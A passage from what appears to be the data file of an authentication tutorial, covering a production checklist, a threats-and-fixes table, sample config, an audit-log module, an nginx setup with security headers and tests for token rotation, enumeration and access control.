  <li>More than 10 <code>mfa.failed</code> for one user in an hour.</li>
  <li>Email provider bounce rate above 5% or complaint rate above 0.1%.</li>
  <li>5xx rate on <code>/api/auth/*</code> above 1%.</li>
</ul>
<h3>Tests that pay for themselves</h3>
<ul>
  <li>Unknown email and wrong password produce identical responses.</li>
  <li>A replayed refresh token revokes its family.</li>
  <li>Another user's resource returns 404.</li>
  <li>Every route without a token returns 401 (loop over the router stack).</li>
  <li>Reset and verification tokens work exactly once and expire.</li>
  <li>A password change invalidates old access tokens.</li>
</ul>
<h3>Build or buy?</h3>
<p>Everything here is a few thousand lines you own and maintain. Hosted providers (Auth0, Clerk, WorkOS, Supabase Auth, Firebase Auth, AWS Cognito) take that on in exchange for cost and some lock-in. Building it yourself is a fine choice for a medium-scale app if you keep it as boring as this guide, and understanding these flows makes you better at using a provider too.</p>`,
    threats: [
      { name: 'Wrong <code>trust proxy</code>', risk: '<code>false</code> behind a proxy puts every user behind one IP; <code>true</code> lets clients spoof <code>X-Forwarded-For</code> to bypass rate limits.', fix: 'Set the exact hop count (<code>1</code> for one load balancer) and log <code>req.ip</code> once to confirm it.' },
      { name: 'Leaked secrets', risk: 'A JWT secret in a public repo or a log lets anyone mint tokens for any user.', fix: 'Secret manager, boot-time validation, per-environment values, secret scanning in CI, a rotation runbook.' },
      { name: 'Per-instance state', risk: 'In-memory rate limits and caches split across instances, so limits multiply by the instance count.', fix: 'Redis for every piece of shared state.' },
      { name: 'Silent failures', risk: 'Reuse detection fires and nobody notices; emails bounce for weeks.', fix: 'Audit log, alerts on the events above, email provider monitoring.' },
      { name: 'Untested restore', risk: 'Backups that have never been restored often turn out to be incomplete when needed.', fix: 'Point-in-time backups and a restore drill each quarter.' },
      { name: 'Over-logging', risk: 'Logs with tokens, reset links or full request bodies become a breach of their own.', fix: 'pino <code>redact</code>, strip query strings from URLs, short retention for raw logs.' },
    ],
    code: [
      {
        file: 'project structure',
        lang: 'none',
        code: code`
server/
├─ src/
│  ├─ app.js                    express wiring (01)
│  ├─ server.js                 connect + listen + graceful shutdown (01)
│  ├─ config/env.js             zod-validated environment (01)
│  ├─ lib/
│  │  ├─ logger.js              pino with redaction (02)
│  │  └─ redis.js               shared ioredis client (04)
│  ├─ models/
│  │  ├─ User.js                (02)
│  │  ├─ Token.js               email verify + reset tokens, TTL (03)
│  │  ├─ RefreshToken.js        rotating sessions (04)
│  │  └─ Project.js             example resource (13)
│  ├─ validation/auth.schemas.js
│  ├─ middleware/
│  │  ├─ auth.js                requireAuth, requireRole (06)
│  │  ├─ rateLimit.js           Redis fixed window (04)
│  │  └─ security.js            helmet, cors, CSRF guard (11)
│  ├─ auth/permissions.js       can(), scopeFor() (06)
│  ├─ services/
│  │  ├─ password.js            argon2id + HIBP (02)
│  │  ├─ token.service.js       JWT + refresh sessions (04)
│  │  ├─ authUser.js            60 s Redis user cache (06)
│  │  ├─ mfa.service.js         TOTP, AES-GCM, backup codes (09)
│  │  ├─ mail.js + mail.templates.js (03)
│  ├─ controllers/
│  │  ├─ signup · login · refresh · sessions · recovery · mfa · google · projects · admin
│  ├─ routes/  auth · mfa · projects
│  ├─ jobs/    mail.queue.js · mail.worker.js (03)
│  └─ utils/   http.js · crypto.js · audit.js (AuditLog model)
├─ test/auth.test.js
└─ .env.example

client/
├─ src/
│  ├─ api/client.js             axios + in-memory token + refresh (05)
│  ├─ auth/                     AuthProvider · ProtectedRoute · RoleGate (06, 12)
│  ├─ pages/                    Login · Register · VerifyEmail · ForgotPassword · ResetPassword
│  │                            OAuthCallback · TwoFactorSetup · Sessions · Security
│  └─ App.jsx
└─ vite.config.js`,
      },
      {
        file: 'server/.env.example',
        lang: 'bash',
        code: code`
NODE_ENV=production
PORT=4000

MONGO_URI=mongodb+srv://api-user:CHANGE_ME@cluster0.abcde.mongodb.net/app?retryWrites=true&w=majority
REDIS_URL=rediss://default:CHANGE_ME@redis.example.internal:6379

# One origin: nginx serves the React build and proxies /api to this server
APP_URL=https://app.example.com
API_URL=https://app.example.com
JWT_ISSUER=app.example.com

# node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
JWT_ACCESS_SECRET=
JWT_MFA_SECRET=
COOKIE_SECRET=
MFA_ENC_KEY=

GOOGLE_CLIENT_ID=1234567890-abc.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=

SMTP_URL=smtps://SES_SMTP_USER:SES_SMTP_PASSWORD@email-smtp.eu-west-1.amazonaws.com:465
MAIL_FROM="YourApp <no-reply@mail.example.com>"

LOG_LEVEL=info`,
      },
      {
        file: 'server/src/utils/audit.js',
        code: code`
import mongoose from 'mongoose';
import { logger } from '../lib/logger.js';

const auditSchema = new mongoose.Schema(
  {
    event: { type: String, required: true, index: true },
    userId: { type: String, index: true },
    ip: String,
    userAgent: String,
    requestId: String,
    data: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: true, updatedAt: false } },
);
auditSchema.index({ createdAt: 1 }, { expireAfterSeconds: 365 * 24 * 60 * 60 });   // keep one year

export const AuditLog = mongoose.model('AuditLog', auditSchema);

// Fire-and-forget: an audit write must never fail or slow down the request
export function audit(req, event, { userId, ...data } = {}) {
  const entry = {
    event,
    userId,
    data,
    ip: req.ip,
    userAgent: req.get('user-agent')?.slice(0, 200),
    requestId: req.id,
  };
  logger.info({ audit: entry }, event);   // ship logs to Datadog, Grafana Loki, Better Stack… and alert there
  AuditLog.create(entry).catch((err) => logger.error({ err }, 'audit write failed'));
}`,
      },
      {
        file: 'server/src/models/Project.js',
        code: code`
import mongoose from 'mongoose';

const projectSchema = new mongoose.Schema(
  {
    name: { type: String, required: true, trim: true, maxlength: 120 },
    description: { type: String, maxlength: 2000 },
    ownerId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, index: true },
  },
  { timestamps: true },
);

// Supports the scoped list query: find({ ownerId }).sort({ updatedAt: -1 })
projectSchema.index({ ownerId: 1, updatedAt: -1 });

export const Project = mongoose.model('Project', projectSchema);`,
      },
      {
        file: 'server/test/auth.test.js',
        note: 'Vitest + supertest + an in-memory MongoDB. Needs a local Redis (docker run -p 6379:6379 redis:7) and test values for the env vars.',
        code: code`
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import request from 'supertest';
import mongoose from 'mongoose';
import { MongoMemoryServer } from 'mongodb-memory-server';
import { app } from '../src/app.js';
import { redis } from '../src/lib/redis.js';
import { User } from '../src/models/User.js';
import { Project } from '../src/models/Project.js';
import { hashPassword } from '../src/services/password.js';
import { signAccessToken } from '../src/services/token.service.js';

const PASSWORD = 'correct horse battery staple';
let mongo;

beforeAll(async () => {
  mongo = await MongoMemoryServer.create();
  await mongoose.connect(mongo.getUri());
  await mongoose.syncIndexes();
});
afterAll(async () => {
  await mongoose.disconnect();
  await mongo.stop();
  redis.disconnect();
});
beforeEach(async () => {
  await mongoose.connection.db.dropDatabase();
  await mongoose.syncIndexes();
  await redis.flushdb();
});

const createUser = async (email) =>
  User.create({ email, name: 'Test', passwordHash: await hashPassword(PASSWORD), emailVerified: true });

const post = (path, body, cookie) => {
  const req = request(app).post(path).set('X-Requested-With', 'fetch').set('Origin', process.env.APP_URL);
  if (cookie) req.set('Cookie', cookie);
  return body ? req.send(body) : req;
};
const cookieFrom = (res) => res.headers['set-cookie'].find((c) => c.startsWith('rt=')).split(';')[0];

describe('login', () => {
  it('answers identically for an unknown email and a wrong password', async () => {
    await createUser('ana@example.com');
    const unknown = await post('/api/auth/login', { email: 'nobody@example.com', password: 'whatever-password' });
    const wrong = await post('/api/auth/login', { email: 'ana@example.com', password: 'wrong-password-123' });
    expect(unknown.status).toBe(401);
    expect(wrong.status).toBe(401);
    expect(unknown.body).toEqual(wrong.body);
  });
});

describe('refresh rotation', () => {
  it('revokes the whole family when a rotated token is replayed', async () => {
    await createUser('ana@example.com');
    const login = await post('/api/auth/login', { email: 'ana@example.com', password: PASSWORD });
    const tokenA = cookieFrom(login);

    const rotated = await post('/api/auth/refresh', null, tokenA);
    expect(rotated.status).toBe(200);
    const tokenB = cookieFrom(rotated);

    expect((await post('/api/auth/refresh', null, tokenA)).status).toBe(401);   // the "stolen" copy
    expect((await post('/api/auth/refresh', null, tokenB)).status).toBe(401);   // the family is dead
  });
});

describe('authorization', () => {
  it("returns 404 for someone else's project", async () => {
    const ana = await createUser('ana@example.com');
    const bob = await createUser('bob@example.com');
    const project = await Project.create({ name: 'Bob only', ownerId: bob._id });

    const res = await request(app)
      .get(\`/api/projects/\${project.id}\`)
      .set('Authorization', \`Bearer \${signAccessToken(ana)}\`);
    expect(res.status).toBe(404);
  });

  it('rejects requests without a token', async () => {
    expect((await request(app).get('/api/projects')).status).toBe(401);
  });
});`,
      },
      {
        file: 'deploy/nginx.conf',
        lang: 'none',
        note: 'Serves the React build and proxies the API on one origin. The CSP here protects the React app; adjust it if you load fonts, analytics or images from other hosts.',
        code: code`
server {
  listen 80;
  server_name app.example.com;
  return 301 https://$host$request_uri;
}

server {
  listen 443 ssl;
  http2 on;
  server_name app.example.com;

  ssl_certificate     /etc/letsencrypt/live/app.example.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/app.example.com/privkey.pem;

  root /var/www/app/dist;

  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
  add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://lh3.googleusercontent.com; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

  location /api/ {
    proxy_pass http://127.0.0.1:4000;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $remote_addr;      # one trusted hop: matches trust proxy = 1
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Request-Id $request_id;
    client_max_body_size 1m;
  }

  # Hashed build assets can be cached forever; index.html never
  location /assets/ {
    expires 1y;
    add_header Cache-Control "public, immutable";
  }
  location / {
    add_header Cache-Control "no-store";
    try_files $uri /index.html;
  }
}`,
      },
    ],
    checklist: [
      'App and API share an origin (or at least a registrable domain)',
      'HTTPS everywhere, HSTS on, HTTP redirects to HTTPS',
      '<code>trust proxy</code> matches the real number of proxy hops',
      'Secrets live in a secret manager, differ per environment, and have a rotation runbook',
      'Rate limits, caches and queues use Redis, not process memory',
      'Unique and TTL indexes are created on deploy',
      'SPF, DKIM and DMARC pass for the sending domain',
      'Audit events are stored and alerts fire on reuse detection and failure spikes',
      'Tests cover enumeration, rotation reuse, IDOR and unauthenticated access',
      'Backups have been restored at least once',
    ],
  });
})();
